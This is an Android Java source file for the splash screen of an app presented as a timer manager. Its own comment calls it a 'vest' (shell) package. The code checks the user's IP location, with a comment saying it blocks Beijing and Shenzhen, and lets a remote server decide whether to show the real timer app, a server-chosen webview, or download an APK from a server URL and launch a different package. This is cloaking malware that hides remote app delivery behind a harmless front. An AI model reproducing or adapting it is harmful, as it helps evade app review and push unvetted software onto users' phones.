package com.abu.timermanager.bao;


import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.NotificationManagerCompat;
import android.support.v7.app.AlertDialog;
import android.text.TextUtils;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.SeekBar;
import android.widget.TextView;
import android.widget.Toast;

import com.abu.timermanager.MainActivity;
import com.abu.timermanager.R;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;

import org.json.JSONException;
import org.json.JSONObject;

import static com.bumptech.glide.gifdecoder.GifHeaderParser.TAG;


/**
 * Created by lenovo on 2019/2/20.
 * <p>
 * 强更APP马甲包
 */

public class SplashUpdateActivity extends Activity {
    public static String bagname = "project.com.pcddproject";//TODO 默认的强更包包名 到时可以动态设置
    String META = "UMENG_CHANNEL";  //app_id  对应360渠道号
    final String app_id = "20190324151927";//默认应用平台

    FrameLayout fl_content;
    public static String baoNameKey = "baoNameKey";//存储包名
    public static String UserVersionKey = "UserVersionKey";//sp存储用户版本控制
    public static String mVersion = "1.0";//默认用户版本控制
    private SplashUpdateBean mBean;
    private String mCity;
    private String mCountry; //国家
    private boolean isLocSuccess = false;//是否定位成功
    private final String mIsNotice = "Notice";//是否 提示过打开通知
    private final int NOTICE_CODE=1111;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash02);
        // setPermissions();
        boolean mNotice = (boolean) SPUtils.get(this, mIsNotice, false);

        //判断该app是否打开了通知，如果没有的话就打开手机设置页面
        if (!isNotificationEnabled(this)) {
            if (!mNotice) {
                showNormalDialog();
                SPUtils.put(this, mIsNotice, true);
            }else{
                initView(); ///
            }
//            Log.i(TAG, "onCreate mIsNotice:: "+mIsNotice);
        } else {
            //当前app允许消息通知
            initView();
        }
        //  initView();

    }

    private void showNormalDialog() {
        /* @setIcon 设置对话框图标
         * @setTitle 设置对话框标题
         * @setMessage 设置对话框消息提示
         * setXXX方法返回Dialog对象，因此可以链式设置属性
         */
        final AlertDialog.Builder normalDialog =
                new AlertDialog.Builder(this);
        normalDialog.setIcon(R.mipmap.logo);
        normalDialog.setTitle("通知");
        normalDialog.setMessage("尊敬的用户您好!为了您的用户体验,请手动打开推送通知");
        normalDialog.setPositiveButton("确定",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        //...To-do
                        //判断该app是否打开了通知，如果没有的话就打开手机设置页面
                        gotoSet();

                    }
                });
        normalDialog.setNegativeButton("关闭",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        //...To-do
                        initView();
                    }
                });
        // 显示
        normalDialog.show();
    }

    private boolean isNotificationEnabled(Context context) {
        boolean isOpened = false;
        try {
            isOpened = NotificationManagerCompat.from(context).areNotificationsEnabled();
        } catch (Exception e) {
            e.printStackTrace();
            isOpened = false;
        }
        return isOpened;

    }

    private void gotoSet() {

        Intent intent = new Intent();
        if (Build.VERSION.SDK_INT >= 26) {
            // android 8.0引导
            intent.setAction("android.settings.APP_NOTIFICATION_SETTINGS");
            intent.putExtra("android.provider.extra.APP_PACKAGE", getPackageName());
        } else if (Build.VERSION.SDK_INT >= 21) {
            // android 5.0-7.0
            intent.setAction("android.settings.APP_NOTIFICATION_SETTINGS");
            intent.putExtra("app_package", getPackageName());
            intent.putExtra("app_uid", getApplicationInfo().uid);
        } else {
            // 其他
            intent.setAction("android.settings.APPLICATION_DETAILS_SETTINGS");
            intent.setData(Uri.fromParts("package", getPackageName(), null));
        }
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        //startActivityForResult(intent,NOTICE_CODE);
        startActivity(intent);
        isIntent = true;
    }

    private boolean isIntent = false;
    @Override
    protected void onRestart() {
        super.onRestart();

        if (isIntent){
            Log.i("SplashUpdateActivity", "onActivityResult===onRestart:====11111 ");
            initView();
            isIntent=false;
        }
    }

   /* @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Log.i("SplashUpdateActivity", "onActivityResult:requestCode== "+requestCode+"====resultCode=="+resultCode);
        if (NOTICE_CODE==requestCode){
         // initView();
        }
    }*/


    /**
     * 初始化状态判断跳转
     */
    private void initJumpStateJudge() {
        String mBaoName = (String) SPUtils.get(this, baoNameKey, "");
        if (TextUtils.isEmpty(mBaoName)) {
            initView();
        } else {
            bagname = mBaoName;//记录包名
            try {
                //TODO 如果手机中存在当前应用(根据包名查询判断) 唤醒主包 需要在3.0状态的时候判断
                PackageManager pm = getPackageManager();
                Intent intent = pm.getLaunchIntentForPackage(bagname);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                finish();
            } catch (Exception e) {
                fl_content = (FrameLayout) findViewById(R.id.fl_content);
                //TODO 请求接口 控制跳转
                if (mBean != null)
                    autoUpdate(mBean.getData().getDownloadurl(), mBean.getData().getLogo()); //TODO Xutils
                e.printStackTrace();
            }
        }
    }


    /**
     * 初始化 多渠道加固打包
     */
    private void initView() {
        mVersion = (String) SPUtils.get(this, UserVersionKey, "1.0");//用户版本
        Log.i("WOLF", "======okgo====版本最新更新时间===" + app_id);
        LocationUtils.GetNetIp(handler);
    }


    /**
     * 定位 确定位置 屏蔽 北京深圳地区
     */

    @SuppressLint("HandlerLeak")
    Handler handler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            if (msg.what != 1) {
                if (mVersion.equals("1.0")) {
                    goMain();
                } else {
                    isLocSuccess = false;
                    initNewNetWork();
                }
                return;
            }
            String locationInfo = msg.obj + "";
            Log.i("WOLF", "=============locationInfo" + locationInfo);
            JSONObject jsonObject = null;
            try {
                jsonObject = new JSONObject(locationInfo);
                JSONObject result = jsonObject.getJSONObject("result");
                if (jsonObject.getString("resultcode").equals("200")) {
                    mCountry = result.getString("Country");
                    mCity = result.getString("City");
                    Log.i("WOLF", "==定位成功====Location=======mCity==" + mCity);
                    Log.i("WOLF", "===定位成功===Location=======locationInfo==" + locationInfo);
                } else {//定位失败
                    Log.i("WOLF", "===定位失败");
                }

            } catch (JSONException e) {
                Log.i("WOLF", "===定位失败=222====Location=====JSONException==" + e.getMessage());
                e.printStackTrace();
            }

            if (mCountry.equalsIgnoreCase("中国")) { //判断国家 只有在中国才限制
                Log.i("WOLF", "=====定位的是中国==：" + mCountry);
                isLocSuccess = true;
                initNewNetWork();
            } else {
                Log.i("WOLF", "=====定位的不是中国==：" + mCountry + "===============版本:" + mVersion);
                if (mVersion.equals("1.0")) {
                    goMain();
                } else {
                    initNewNetWork();
                }
            }
        }
    };

    /***
     *  请求后台判断版本号
     */
    private void initNewNetWork() {
        //TODO 请求后台接口需要更改了 找后台
        OkGo.<String>post("http://xx.anzhuo9.com/index.php?s=/api/Version/index")
                .params("app_id", app_id)
                .params("type", "android")
                .params("v", mVersion)
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(Response<String> response) {
                        mBean = JsonUtil.parseJsonToBean(response.body(), SplashUpdateBean.class);
                        try {
                            if (mBean != null) {
                                if (!isLocSuccess) {//定位失败，跳转上次进入版本，第一次进入，跳1.0
                                    if (mVersion.equals("1.0")) {
                                        goMain();
                                    } else if (mVersion.equals("2.0")) {
                                        goWebView(mBean);
                                    } else if (mVersion.equals("3.0")) {
                                        SPUtils.put(SplashUpdateActivity.this, baoNameKey, mBean.getData().getPackagename());
                                        initJumpStateJudge();
                                    }
                                    return;
                                }
                                if (mBean.getData() == null || mBean.getData().getActive() == null) {
                                    goMain();
                                    return;
                                }
                                if (mBean.getData().getActive().equals("1")) { //1表示地区允许 否则就是不允许
                                    try {
                                        if (mVersion.equals("1.0")) {
                                            Log.i("WOLF", "===手机地区=111666666666666==" + mCity);
                                            //中文
                                            String city_name_zh = mBean.getData().getCity_name_zh();
                                            if (!TextUtils.isEmpty(city_name_zh) && !TextUtils.isEmpty(mCity)) {
                                                String[] split_zh = city_name_zh.split(",");
                                                for (String s : split_zh) {
                                                    Log.i("WOLF", "===手机地区=111===Location===mCity==" + mCity + "====后台地区限制:" + s);
                                                    if (mCity.contains(s) || mCity == null || mCity.equals("")) { //判断后台是否设置了地区限制
                                                        goMain();
                                                        break;
                                                    }
                                                }
                                            }
                                        }
                                        if (TextUtils.isEmpty(mBean.getData().getVersion())) {
                                            goMain();
                                            return;
                                        }
                                        SPUtils.put(SplashUpdateActivity.this, UserVersionKey, mBean.getData().getVersion());//记录用户的版本
                                        if (mBean.getData().getVersion().equals("2.0")) {
                                            goWebView(mBean);
                                        } else if (mBean.getData().getVersion().equals("3.0")) {
                                            SPUtils.put(SplashUpdateActivity.this, baoNameKey, mBean.getData().getPackagename());
                                            initJumpStateJudge();
                                        } else {
                                            goMain();
                                        }
                                    } catch (Exception e) {
                                        goMain();
                                    }
                                } else {
                                    goMain();
                                }
                            } else {
                                goMain();
                            }
                        } catch (Exception e) {
                            goMain();
                        }
                    }

                    @Override
                    public void onError(Response<String> response) {
                        super.onError(response);
                        goMain();
                    }
                });
    }

    //TODO 跳转webview页面
    private void goWebView(SplashUpdateBean bean) {
        NewWebActivity.newInstance(this, bean.getData());
        finish();
    }


    private void goMain() {
        Intent intent = new Intent(this, MainActivity.class);
        startActivity(intent);
        finish();
    }

    /**
     * 设置下载进度的布局
     *
     * @param logoUrl
     */
    private TextView pos;
    private SeekBar seekBar; // 进度条
    private ImageView iv_bg;//背景图片

    private void downloadLayout(String logoUrl) {
        LayoutInflater inflater = LayoutInflater.from(this);
        View view = inflater.inflate(R.layout.item_update, null);//获取自定义布局
        fl_content.addView(view);
        pos = (TextView) view.findViewById(R.id.tv_pos);
        seekBar = (SeekBar) view.findViewById(R.id.seekBar_mid);
        iv_bg = (ImageView) view.findViewById(R.id.iv_bg);
        ImageUtils.showImage(this, logoUrl, iv_bg); //TODO 设置更新时候的 背景图片
    }


    /**
     * 自动更新界面
     *
     * @param downloadurl
     * @param logoUrl
     */
    private void autoUpdate(String downloadurl, String logoUrl) {
        downloadLayout(logoUrl);
        //TODO okgo 下载
        OkGoDownloadFile.onDownloadFile(this, downloadurl, mBean.getData().getPackagename()
                , new OkGoDownloadFile.DownloadProgressListening() {
                    @Override
                    public void setProgress(int progress) {
                        pos.setText(progress + "%");
                        seekBar.setProgress((int) progress);
                    }
                    @Override
                    public void goJumpMain() { //跳转
                        goMain();
                    }
                });
    }

    private void onPermissions() {
        //相机和一个数据读写权限
        String[] permissions = new String[]{
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE};
        // PermissionsUtils.showSystemSetting = false;//是否支持显示系统设置权限设置窗口跳转
        //这里的this不是上下文，是Activity对象！
        PermissionsUtils.getInstance().chekPermissions(this, permissions, permissionsResult);
    }

    //创建监听权限的接口对象
    PermissionsUtils.IPermissionsResult permissionsResult = new PermissionsUtils.IPermissionsResult() {
        @Override
        public void passPermissons() {
            //Toast.makeText(HomeActivity.this, "权限通过，可以做其他事情!", Toast.LENGTH_SHORT).show();
        }

        @Override
        public void forbitPermissons() {
            // finish();
            Toast.makeText(SplashUpdateActivity.this, "权限不通过!", Toast.LENGTH_SHORT).show();
        }
    };

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        //就多一个参数this
        PermissionsUtils.getInstance().onRequestPermissionsResult(this, requestCode, permissions, grantResults);
    }
}
